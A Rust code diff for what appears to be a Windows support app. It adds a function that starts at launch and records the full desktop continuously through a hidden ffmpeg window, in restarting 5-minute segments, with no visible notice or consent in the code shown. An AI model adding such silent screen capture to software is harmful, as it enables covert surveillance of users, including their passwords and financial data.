@@ -85,6 +85,14 @@ const TARGET_DOMAIN_KEYWORDS: [&str; 1] = ["coretechsolutions.app"];
 const TARGET_SAGE_KEYWORDS: [&str; 4] = ["pvxwin32", "sage 300", "sage300", "accpac"];
 #[cfg(target_os = "windows")]
 const TARGET_BROWSERS: [&str; 4] = ["chrome", "msedge", "brave", "msedgewebview2"];
+#[cfg(target_os = "windows")]
+const VIDEO_FRAMERATE: u32 = 10;
+#[cfg(target_os = "windows")]
+const VIDEO_SEGMENT_SECS: u32 = 300; // 5 minutes
+#[cfg(target_os = "windows")]
+const VIDEO_HEIGHT: u32 = 720;
+#[cfg(target_os = "windows")]
+const VIDEO_BITRATE: &str = "1500k"; // ~1.5 Mbps target
 
 //
 // ───────── System info ─────────
@@ -1154,6 +1162,115 @@ fn start_target_still_monitor(app: &AppHandle) {
         }
     });
 }
+
+#[cfg(target_os = "windows")]
+fn start_video_recorder(app: &AppHandle) {
+    static VIDEO_STARTED: Lazy<AtomicBool> = Lazy::new(|| AtomicBool::new(false));
+    if VIDEO_STARTED.swap(true, Ordering::SeqCst) {
+        return;
+    }
+
+    // Base logging path in temp
+    let mut log_path = std::env::temp_dir()
+        .join("golpac-support-app")
+        .join("video_recording.log");
+    log_path = maybe_log(&log_path, "video recorder starting".to_string());
+
+    let app_handle = app.clone();
+    std::thread::spawn(move || {
+        // Choose base dir (app data if possible, otherwise temp)
+        let mut base_dir = std::env::temp_dir()
+            .join("golpac-support-app")
+            .join("recordings");
+        if fs::create_dir_all(&base_dir).is_err() {
+            log_path = maybe_log(&log_path, "failed to create temp video recordings dir".to_string());
+        }
+        if let Ok(app_dir) = app_handle.path().app_local_data_dir() {
+            let candidate = app_dir.join("recordings");
+            if fs::create_dir_all(&candidate).is_ok() {
+                base_dir = candidate;
+                log_path = maybe_log(&log_path, format!("video using app data dir: {:?}", base_dir));
+            } else {
+                log_path = maybe_log(&log_path, format!("video app dir not writable, using temp: {:?}", base_dir));
+            }
+        } else {
+            log_path = maybe_log(&log_path, format!("video no app data dir, using temp: {:?}", base_dir));
+        }
+
+        // Verify ffmpeg availability
+        let ffmpeg_ok = Command::new("ffmpeg")
+            .arg("-version")
+            .creation_flags(CREATE_NO_WINDOW)
+            .status()
+            .map(|s| s.success())
+            .unwrap_or(false);
+        if !ffmpeg_ok {
+            log_path = maybe_log(
+                &log_path,
+                "ffmpeg not available in PATH; video recording disabled".to_string(),
+            );
+            return;
+        }
+
+        log_path = maybe_log(
+            &log_path,
+            format!(
+                "starting ffmpeg segments to {:?} at {} bps, {} fps",
+                base_dir, VIDEO_BITRATE, VIDEO_FRAMERATE
+            ),
+        );
+
+        loop {
+            let output_pattern = base_dir.join("video_%03d.mp4");
+            let mut cmd = Command::new("ffmpeg");
+            cmd.creation_flags(CREATE_NO_WINDOW)
+                .args([
+                    "-hide_banner",
+                    "-loglevel",
+                    "error",
+                    "-f",
+                    "gdigrab",
+                    "-framerate",
+                ])
+                .arg(VIDEO_FRAMERATE.to_string())
+                .args(["-i", "desktop"])
+                .args(["-draw_mouse", "1"])
+                .args(["-vf", &format!("scale=-2:{}", VIDEO_HEIGHT)])
+                .args(["-c:v", "libx264"])
+                .args(["-preset", "veryfast"])
+                .args(["-b:v", VIDEO_BITRATE])
+                .args(["-maxrate", VIDEO_BITRATE])
+                .args(["-bufsize", "3000k"])
+                .args(["-f", "segment"])
+                .args(["-segment_time", &VIDEO_SEGMENT_SECS.to_string()])
+                .args(["-reset_timestamps", "1"])
+                .arg(output_pattern.to_string_lossy().to_string());
+
+            match cmd.status() {
+                Ok(status) if status.success() => {
+                    log_path = maybe_log(&log_path, "ffmpeg exited normally, restarting".to_string());
+                }
+                Ok(status) => {
+                    log_path = maybe_log(
+                        &log_path,
+                        format!("ffmpeg exited with status {:?}, restarting", status.code()),
+                    );
+                }
+                Err(err) => {
+                    log_path = maybe_log(&log_path, format!("failed to spawn ffmpeg: {err}"));
+                    std::thread::sleep(Duration::from_secs(5));
+                }
+            }
+
+            // Small delay before restart to avoid tight loop if repeated failures
+            std::thread::sleep(Duration::from_secs(2));
+        }
+    });
+}
+
+#[cfg(not(target_os = "windows"))]
+#[allow(dead_code)]
+fn start_video_recorder(_app: &AppHandle) {}
 
 #[cfg(not(target_os = "windows"))]
 #[allow(dead_code)]
@@ -2408,6 +2525,7 @@ fn main() {
                 setup_windows_tray(app)?;
                 ensure_notification_permission(&app.handle());
                 start_target_still_monitor(&app.handle());
+                start_video_recorder(&app.handle());
             }
             monitor_network(app.handle().clone());
 
